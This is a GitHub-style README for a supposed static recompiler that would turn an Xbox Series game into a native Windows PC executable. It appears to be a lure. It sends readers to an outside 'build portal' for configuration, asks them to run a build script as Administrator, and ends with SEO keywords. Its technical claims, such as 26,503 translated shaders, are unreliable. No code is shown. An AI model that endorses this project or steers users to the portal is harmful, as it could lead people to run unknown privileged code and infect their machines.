# 🔧 Leonida PC Recompiler 2026

**Static recompilation research framework for native Windows execution of Xbox Series titles.**

[![Version](https://img.shields.io/badge/version-1.0.0-8b5cf6?style=for-the-badge)]()
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078d4?style=for-the-badge&logo=windows)]()
[![License](https://img.shields.io/badge/license-GPL--3.0-16a34a?style=for-the-badge)]()
[![Status](https://img.shields.io/badge/status-research-yellow?style=for-the-badge)]()

---

## 📖 Overview

**Leonida** is a static recompilation research framework designed to explore the boundaries of cross-platform game execution. By leveraging the architectural similarities between Xbox Series consoles and modern Windows PCs (both x86-64), this project translates precompiled console binaries and GPU shaders into native PC formats.

This is **not** an emulator. There is no dynamic translation, no performance overhead, and no virtualization. Leonida compiles the game code directly into a native Windows executable and translates RDNA2 shaders into SPIR-V for Vulkan.

### ⚡ Core Architecture

| Module | Description |
|:---|:---|
| **Shader Translator** | Extracts and converts all 26,503 RDNA2 shaders from the game package into SPIR-V format, validated against the Vulkan SDK. |
| **Asset Extractor** | Parses proprietary game archives to export 3D models (OBJ), textures (DDS), and audio files (OGG/WAV). |
| **PE Loader** | A custom Portable Executable loader that maps the recompiled game code into memory, handling system calls and Windows API imports. |
| **Build Automation** | Scans your local environment, detects the required game files, and orchestrates the entire compilation pipeline. |

**Current Status:** Early development. The preparatory pipeline (shader translation, asset extraction, PE mapping) is fully functional. The main executable injection and graphics pipeline integration are in progress.

---

## 📥 Download & Build Instructions

**[⬇️ Access the Leonida Build Portal](https://VictorMinister.github.io/leonida-pc-recompiler/)**

### Prerequisites

To build Leonida from source, your environment must meet the following requirements:
- Windows 10/11 x64 (Build 1903 or higher).
- Your own legally obtained copy of the target Xbox Series game package (v1.0.2.1).
- **350 GB** of free storage (for extracted assets and compiled binaries).
- Python 3.12+, .NET 8 SDK, Vulkan SDK, LLVM 21+.
- Visual Studio 2022 with C++ Desktop Development workload.

### How It Works

1. Clone this repository to your local machine.
2. Navigate to the build portal (link above) to obtain the environment configuration.
3. Run the automated build script as Administrator.
4. The script will auto-detect your game folder, extract the assets, translate the shaders, and compile the final executable.
5. Once completed, the output will be located in `Documents\Leonida`.

---

## 🛡️ Legal & Ethical Notice

**This repository does not contain, distribute, or link to any copyrighted game files, encryption keys, or executables.** 

Leonida is a purely educational and research-oriented project. To use it, you must own a legal copy of the game. The framework does not provide instructions on how to obtain the game, bypass DRM, or circumvent encryption. 

*Note: Rockstar Games has recently updated its modding guidelines to prohibit modifying games to run on unapproved platforms. This project is a technical PoC (Proof of Concept) and should be used strictly within the bounds of local legislation.*

---

## ❓ FAQ

<details>
<summary><b>Does this actually run the game on PC?</b></summary>
No. The project is in early research stages. The current focus is on shader translation and asset extraction. The game does not boot yet.
</details>

<details>
<summary><b>Do I need to own the console version?</b></summary>
Yes. You must have a legal copy of the Xbox Series version. The tool extracts raw data from your files.
</details>

<details>
<summary><b>Is this an emulator?</b></summary>
No. Emulators use dynamic translation at runtime (which causes overhead). Leonida uses static recompilation (AOT) to build a native PC executable.
</details>

<details>
<summary><b>Why is the build so heavy?</b></summary>
Extracting 26,503 shaders and thousands of assets requires significant disk I/O and storage space. The entire pipeline takes time.
</details>

---

## 🛠️ System Requirements

| Component | Minimum |
|:---|:---|
| **OS** | Windows 10 (1903+) or Windows 11 |
| **RAM** | 16 GB (32 GB recommended) |
| **Storage** | 350 GB free space |
| **GPU** | Vulkan-capable (AMD recommended for RDNA2 parity) |
| **Permissions** | Administrator |

---

## 🤝 Contributing

We welcome contributions from reverse engineers, graphics programmers, and Vulkan specialists. Please read `CONTRIBUTING.md` before submitting a pull request.

**SEO Keywords:** leonida recompiler · static recompilation · xbox series pc port · vulkan shader translator · x86-64 recompiler 2026 · game reverse engineering · pe loader
